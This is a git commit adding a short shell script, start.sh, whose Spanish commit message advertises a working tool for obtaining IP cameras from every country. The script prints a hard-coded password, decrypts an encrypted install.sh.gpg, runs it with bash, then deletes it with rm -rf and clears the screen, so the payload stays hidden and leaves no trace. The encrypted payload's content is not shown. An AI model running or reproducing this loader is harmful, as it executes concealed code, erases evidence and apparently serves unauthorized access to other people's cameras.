3908a266ca34e6a67a2a79f5a3aed5155e379c1c
TENSHI101 <48865498+garciarodrigue@users.noreply.github.com>
2022-03-07 14:37:32 -0600

    Add files via upload
    Este escript funcional para obtener cámaras ip de todo los pises

---
+++ start.sh
@@ -0,0 +1,16 @@
+pip install gnupg 
+setterm -foreground blue
+echo "La contraseña es"
+setterm -foreground yellow
+echo "in_3xprecion1175101"
+setterm -foreground blue
+echo "O"
+setterm -foreground blue
+echo "in_3xprecion1011175"
+sleep 9.0
+gpg install.sh.gpg
+bash install.sh
+sleep 15.0
+rm -rf install.sh
+clear
+
